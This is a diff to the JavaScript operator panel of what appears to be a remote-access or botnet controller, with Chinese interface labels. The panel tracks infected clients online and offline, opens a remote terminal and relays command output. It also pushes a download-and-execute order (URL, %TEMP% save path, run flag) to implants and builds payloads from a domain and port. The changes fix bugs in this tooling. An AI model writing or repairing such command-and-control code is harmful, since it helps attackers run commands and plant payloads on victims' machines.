@@ -40,7 +40,7 @@ ws.onmessage = function (evt) {
             <td><a href="javascript:new_cmd('` + z["info"]["ip"] + `','` + data["data"]["uuid"] + `');">终端</a> <a href="javascript:download('` + z["info"]["ip"] + `','` + data["data"]["uuid"] + `');" >下载</a> <a href="#">卸载</a></td>
             `
             );
-            $("#log").append("<p style='color:green'>客户上线：" + ip + "</p>")
+            $("#log").append("<p style='color:green'>客户上线：" + z["info"]["ip"] + "</p>")
         }
     }
     if (data["action"] === "online") {
@@ -63,16 +63,16 @@ ws.onmessage = function (evt) {
     }
     if (data["action"] === "offline") {
         $(`#` + data["data"]["uuid"]).remove();
-        $("#log").append("<p style='color:#ff0000'>客户下线：" + i["ip"] + "</p>")
+        $("#log").append("<p style='color:#ff0000'>客户下线：" + data["data"]["info"]["ip"] + "</p>")
     }
     if (data["action"] === "result") {
         if (data["data"]["action"] === "cmd") {
             $(`#cmd_textarea`).val($(`#cmd_textarea`).val() + "From " + data["data"]["uuid"] + ":\n\t" + data["data"]["data"] + "\n");
             $("#cmd_textarea").scrollTop($("#cmd_textarea")[0].scrollHeight);
-        }else{
-            $("#"+data["data"]["uuid"]+" td")[4].innerText = data["data"]["data"]
-            setTimeout(function() {
-                $("#"+data["data"]["uuid"]+" td")[4].innerText = "Loop"
+        } else {
+            $("#" + data["data"]["uuid"] + " td")[5].innerText = data["data"]["data"]
+            setTimeout(function () {
+                $("#" + data["data"]["uuid"] + " td")[5].innerText = "Loop"
             }, 5000);
         }
 
@@ -159,17 +159,17 @@ function new_cmd(ip, id) {
 
 
 function down_btu_on() {
-    if ($("#http_address").val() == "") {
+    if ($("#http_address").val() === "") {
         $("#error_http_address").html("网址不能为空");
         return;
     }
-    if ($("#save_path").val() == "") {
+    if ($("#save_path").val() === "") {
         $("#error_save_path").html("将写入默认目录");
         $("#save_path").val("%TEMP%")
     }
     let url = $("#http_address").val()
     let path = $("#save_path").val()
-    let is_run = $("is_run").val()
+    let is_run = $("#is_run").val()
     let b64 = btoa(JSON.stringify({
         "url": url,
         "path": path,
@@ -188,11 +188,11 @@ function down_btu_on() {
 }
 
 function generate_btu_on() {
-    if ($("#domain").val() == "") {
+    if ($("#domain").val() === "") {
         $("#error_domain").html("域名不能为空");
         return;
     }
-    if ($("#port").val() == "") {
+    if ($("#port").val() === "") {
         $("#error_port").html("端口不能为空");
         return;
     }
